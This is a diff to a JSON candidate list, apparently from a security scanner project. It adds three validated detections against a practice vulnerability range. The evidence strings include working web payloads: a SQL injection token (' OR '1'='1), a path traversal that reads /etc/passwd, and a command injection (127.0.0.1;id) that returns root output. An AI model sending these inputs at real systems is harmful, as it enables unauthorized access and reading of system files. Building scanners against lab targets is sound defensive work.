@@ -1,6 +1,24 @@
 {
   "candidates": [
     {
+      "source": "discovery:the-range.appsec.study",
+      "slug": "the-range-blind-sqli-c2-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /api/c/2?token=' OR '1'='1 flips valid:false→true while benign token stays false; the-range.appsec.study/ findings 9→12 (+the-range-blind-sqli-c2-live-oracle +route); benchmark juice-shop-staging 52 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:the-range.appsec.study",
+      "slug": "the-range-lfi-c4-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /api/c/4?file=../../../etc/passwd returns root:x:0:0:root passwd lines; the-range.appsec.study/api/c/4 findings 9→13 (+the-range-lfi-c4-live-oracle +route); benchmark juice-shop-staging 52 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:the-range.appsec.study",
+      "slug": "the-range-cmd-inj-c6-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST /api/c/6 host=127.0.0.1;id appends uid=0(root) to ping output; the-range.appsec.study/api/c/6 findings 9→13 (+the-range-cmd-inj-c6-live-oracle +route); benchmark juice-shop-staging 52 findings 6/6 maintained"
+    },
+    {
       "source": "discovery:sqli.vulnlab.dev",
       "slug": "sqli-vulnlab-second-order-user-id-extraction-fix",
       "status": "shipped",
